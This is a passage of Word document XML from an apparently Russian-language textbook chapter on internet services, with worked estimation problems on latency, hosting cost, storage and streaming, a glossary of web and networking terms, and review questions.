        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время распространения сигнала</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (propagation delay):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>t = \frac{\text{Расстояние}}{\text{Скорость света}} = \frac{8000 \text{ км}}{200000 \text{ км/с}} = 0.04 \text{ с} = 40 \text{ мс}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>односторонняя задержка</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (от тебя к собеседнику).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RTT (туда-обратно)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = 2 × 40 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>80 мс</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но</w:t>
      </w:r>
      <w:r>
        <w:t>: реальная задержка больше из-за:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обработки на роутерах (~5-10 мс на каждый роутер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буферизации (~10 мс)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кодирования/декодирования (~10 мс)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальная задержка</w:t>
      </w:r>
      <w:r>
        <w:t>: ~80-120 мс (вполне приемлемо для звонка).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~80-120 мс</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Стоимость хостинга веб-сайта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Твой сайт посещают 100,000 человек в месяц. Средняя страница весит 2 МБ. Хостинг на AWS (Amazon S3 + CloudFront CDN) стоит $0.02 за 1 ГБ трафика. Сколько стоит трафик в месяц?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Трафик в месяц</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>100000 \text{ посещений} \times 2 \text{ МБ} = 200000 \text{ МБ} = 200 \text{ ГБ}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стоимость</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>200 \text{ ГБ} \times \$0.02 = \$4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$4/месяц</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (дёшево!).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если сайт взорвётся (миллион посещений) → стоимость будет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$40/месяц</w:t>
      </w:r>
      <w:r>
        <w:t>. Хостинг масштабируется пропорционально трафику.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 6: Размер музыкальной коллекции в стриминге</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Spotify имеет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100 миллионов треков</w:t>
      </w:r>
      <w:r>
        <w:t>. Средний трек весит 5 МБ (в сжатом виде, MP3 320 Кбит/с). Сколько места занимает вся библиотека Spotify?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>100000000 \text{ треков} \times 5 \text{ МБ} = 500000000 \text{ МБ} = 500000 \text{ ГБ} = 500 \text{ ТБ}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>500 терабайт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (полтысячи жёстких дисков по 1 ТБ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>На самом деле</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Spotify хранит треки в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нескольких качествах</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (96, 160, 320 Кбит/с) → реальный объём </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~2-3 петабайта</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 7: Сколько одновременных Zoom-звонков выдержит интернет-канал?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: У тебя интернет 100 Мбит/с. Zoom-звонок (видео 720p) требует 2.5 Мбит/с. Сколько одновременных Zoom-звонков можно вести?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\frac{100 \text{ Мбит/с}}{2.5 \text{ Мбит/с}} = 40 \text{ звонков}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: это в идеале. На практике надо оставлять запас (~70% от пропускной способности), так что реально </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~28-30 звонков</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~30 Zoom-звонков</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> одновременно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 8: Сколько фильмов поместится в облаке?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: У тебя Google Drive на 2 ТБ. Фильм в 1080p весит в среднем 2 ГБ. Сколько фильмов поместится?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\frac{2 \text{ ТБ}}{2 \text{ ГБ}} = \frac{2000 \text{ ГБ}}{2 \text{ ГБ}} = 1000 \text{ фильмов}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1000 фильмов</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: если фильмы в 4K → 1 фильм = ~20 ГБ → поместится </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100 фильмов</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 9: Доля трафика Netflix в интернете</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Netflix занимает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>15%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> всего интернет-трафика. Мировой трафик в 2025 году = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5000 экзабайт/год</w:t>
      </w:r>
      <w:r>
        <w:t>. Сколько трафика генерирует Netflix?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5000 \text{ EB} \times 0.15 = 750 \text{ EB}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>750 \text{ EB} = 750000000 \text{ ТБ}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>750 экзабайт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в год, или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~750 миллионов терабайт</w:t>
      </w:r>
      <w:r>
        <w:t>. 🤯</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>охренительно много</w:t>
      </w:r>
      <w:r>
        <w:t>. Для сравнения, всё содержимое Википедии (все статьи на всех языках) = ~20 ТБ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 10: Стоимость подписки на все стриминги</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты хочешь подписаться на Netflix, Spotify, YouTube Premium, Disney+, HBO Max. Сколько это стоит в год?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Сервис | Стоимость/месяц |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|----------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Netflix | $15 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Spotify | $10 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| YouTube Premium | $12 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Disney+ | $8 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| HBO Max | $15 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого/месяц</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$60</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стоимость в год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: $60 × 12 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$720</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Набор подписок обходится </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>дороже</w:t>
      </w:r>
      <w:r>
        <w:t>, чем раньше стоил кабельное ТВ (~$50/мес). Парадокс: отказались от кабельного, чтобы сэкономить, а в итоге платим больше. 🤡</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WWW (World Wide Web)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — глобальная система гипертекстовых документов, связанных гиперссылками.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Браузер (Browser)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — программа для просмотра веб-страниц (Chrome, Safari, Firefox).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Веб-сервер (Web Server)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — программа, отдающая веб-страницы по HTTP/HTTPS (Nginx, Apache).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статический сайт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — HTML-файлы лежат на диске, сервер отдаёт их как есть.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динамический сайт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — HTML генерируется на лету сервером (PHP, Python, Node.js).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CMS (Content Management System)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система управления контентом (WordPress, Joomla).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Email</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — электронная почта, служба отправки сообщений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SMTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол отправки почты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>POP3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол получения почты (скачивание с удалением с сервера).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IMAP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол работы с почтой на сервере (синхронизация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Спам</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — нежелательные письма (реклама, мошенничество).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Фишинг (Phishing)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — попытка выудить логины/пароли через поддельные письма.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Поисковая система (Search Engine)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сервис для поиска информации в интернете (Google, Яндекс).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SEO (Search Engine Optimization)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — оптимизация сайта для поисковиков.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Облачное хранилище (Cloud Storage)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — диск в интернете (Google Drive, Dropbox).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IaaS (Infrastructure as a Service)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — аренда виртуальных серверов (AWS EC2).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PaaS (Platform as a Service)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — платформа для разработки (Heroku).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SaaS (Software as a Service)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — готовое приложение в браузере (Gmail, Zoom).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Социальная сеть (Social Network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — платформа для общения и публикации контента (Facebook, Instagram, TikTok).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мессенджер (Instant Messenger)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — приложение для обмена текстовыми сообщениями (WhatsApp, Telegram).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>End-to-End Encryption (E2E)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — шифрование от конца до конца (только отправитель и получатель могут прочитать).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VoIP (Voice over IP)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — технология передачи голоса через интернет (Zoom, Skype).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стриминг (Streaming)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — воспроизведение видео/аудио во время загрузки (без скачивания всего файла).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Адаптивный битрейт (Adaptive Bitrate Streaming)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — автоматическое переключение качества видео в зависимости от скорости интернета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Буферизация (Buffering)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — загрузка нескольких секунд видео вперёд (чтобы компенсировать колебания скорости).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>P2P (Peer-to-Peer)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — децентрализованная сеть, где пользователи соединяются напрямую (торренты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Торрент (BitTorrent)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол P2P для скачивания файлов от других пользователей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кодек</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм сжатия/распаковки аудио/видео (Opus, H.264, AAC).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: В чём разница между статическим и динамическим сайтом? Приведи примеры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Как работает поисковая система? Опиши три этапа: краулинг, индексация, ранжирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Что такое облачные вычисления? В чём разница между IaaS, PaaS и SaaS?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика**: Ты открываешь `https://google.com` в браузере. Опиши пошагово, что происходит (DNS, TCP, TLS, HTTP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: Ты смотришь Netflix (битрейт 8 Мбит/с) 3 часа в день в течение месяца (30 дней). Сколько трафика потрачено?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Что такое End-to-End шифрование (E2E)? Какие мессенджеры его используют по умолчанию?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика**: Почему онлайн-игры и VoIP используют UDP, а не TCP? Какие проблемы это создаёт?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: У тебя интернет 50 Мбит/с. Zoom-звонок требует 3 Мбит/с. Сколько одновременных звонков можно вести (с запасом 30%)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Как работает стриминг? Что такое адаптивный битрейт?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Критическое мышление**: Почему набор подписок (Netflix, Spotify, YouTube Premium, Disney+) может стоить дороже, чем раньше стоил кабельное ТВ? В чём парадокс?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
